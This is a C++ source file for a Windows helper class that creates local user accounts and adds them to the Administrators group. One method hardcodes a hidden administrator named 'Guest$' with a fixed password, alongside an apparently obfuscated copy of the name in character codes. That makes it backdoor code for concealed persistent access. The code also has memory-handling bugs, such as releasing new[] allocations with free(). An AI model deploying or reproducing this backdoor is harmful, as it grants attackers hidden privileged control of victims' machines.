#include "NetUserHelper.h"

BOOL NetUserHelper::addUser(LPWSTR username, LPWSTR password) {
    USER_INFO_1 ui;
    // DWORD dwLevel = 1;
    DWORD dwError = 0;
    NET_API_STATUS nStatus;

    //
    // Set up the USER_INFO_1 structure.
    //  USER_PRIV_USER: name identifies a user, 
    //    rather than an administrator or a guest.
    //  UF_SCRIPT: required 
    //
    ui.usri1_name = username;
    ui.usri1_password = password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT + UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;
    //
    // Call the NetUserAdd function, specifying level 1.
    //
    nStatus = NetUserAdd(NULL,
        1,
        (LPBYTE)&ui,
        &dwError);
    //
    // If the call succeeds, inform the user.
    //
    if (nStatus == NERR_UserExists) {
        USER_INFO_1003 _ui;
        _ui.usri1003_password = password;
        nStatus = NetUserSetInfo(NULL,
            username,
            1003,
            (LPBYTE)&_ui,
            &dwError);
    }

    if (nStatus == NERR_Success) {
        fwprintf(stderr, L"User account %s has been added, the password is %s\n", username, password);
        return TRUE;
    } 
    else {
        fprintf(stderr, "A system error has occurred while adding user: %d\n", nStatus);
        if (nStatus == ERROR_INVALID_PARAMETER) {
            fprintf(stderr, "The error parameter index is %d\n", dwError);
        }
        return FALSE;
    }
}

LPWSTR NetUserHelper::ConvertCharToLPWSTR(const char* szString, int len = 0) {
    int dwLen = len + 1;
    if (dwLen <= 1) {
        dwLen = strlen(szString) + 1;
    }
    int nwLen = MultiByteToWideChar(CP_ACP, 0, szString, dwLen, NULL, 0);
    LPWSTR lpszPath = new WCHAR[dwLen];
    MultiByteToWideChar(CP_ACP, 0, szString, dwLen, lpszPath, nwLen);
    return lpszPath;
}

BOOL NetUserHelper::addAdministrator(LPWSTR username, LPWSTR password) {
   if(this->addUser(username, password)) {
        return this->makeUserAdmin(username);
   } else {
        return FALSE;
   }
}

BOOL NetUserHelper::addUserToGroup(LPWSTR strUserName, LPWSTR strGroupName) {
    LOCALGROUP_MEMBERS_INFO_3* group = new LOCALGROUP_MEMBERS_INFO_3();
    group->lgrmi3_domainandname = strUserName;

    int res = NetLocalGroupAddMembers(NULL, strGroupName, 3, (LPBYTE)group, 1);
    if (res == NERR_Success)
    {
        return TRUE;
    }
    else {
        fprintf(stderr, "A system error has occurred while adding user to localgroup: %d\n", res);
        return FALSE;
    }
}

BOOL NetUserHelper::makeUserAdmin(IN PCWSTR pszUserName) {
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSidAdmins = NULL;
    BOOL bOk = FALSE;

    __try
    {
        // initialize well-known SID of the local administrators group
        if (!AllocateAndInitializeSid(&siaNT, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSidAdmins))
            __leave;

        WCHAR szGroupName[UNLEN + 1];
        WCHAR szDomainName[DNLEN + 1];
        ULONG cchGroupName = UNLEN + 1;
        ULONG cchDomainName = DNLEN + 1;
        SID_NAME_USE Use;

        // convert SID to the localized name of the group
        if (!LookupAccountSidW(NULL, pSidAdmins, szGroupName, &cchGroupName,
            szDomainName, &cchDomainName, &Use))
            __leave;

        // prepare user name
        LOCALGROUP_MEMBERS_INFO_3 info;
        info.lgrmi3_domainandname = (PWSTR)pszUserName;

        // add the user to the administrators group
        if (NetLocalGroupAddMembers(NULL, szGroupName, 3,
            (PBYTE)&info, 1) != ERROR_SUCCESS)
            __leave;

        bOk = TRUE;
    }
    __finally
    {
        if (pSidAdmins != NULL)
            FreeSid(pSidAdmins);
    }

    return bOk;
}


BOOL NetUserHelper::addAdministrator() {
    const char _u[7] = { 71, 117, 101, 115, 116, 36, 0 };
    LPWSTR username = ConvertCharToLPWSTR("Guest$");
    LPWSTR password = ConvertCharToLPWSTR("456321nimD@");
    BOOL ret = this->addAdministrator(username, password);
    free(username);
    free(password);
    return ret;
}

NetUserHelper::Deletor::~Deletor() {
    if (NetUserHelper::instance != NULL) {
        delete NetUserHelper::instance;
    }
}

NetUserHelper* NetUserHelper::instance = NULL;
NetUserHelper* NetUserHelper::getInstance() {
    if (instance == NULL) {
        instance = new NetUserHelper();
    }
    return instance;
}
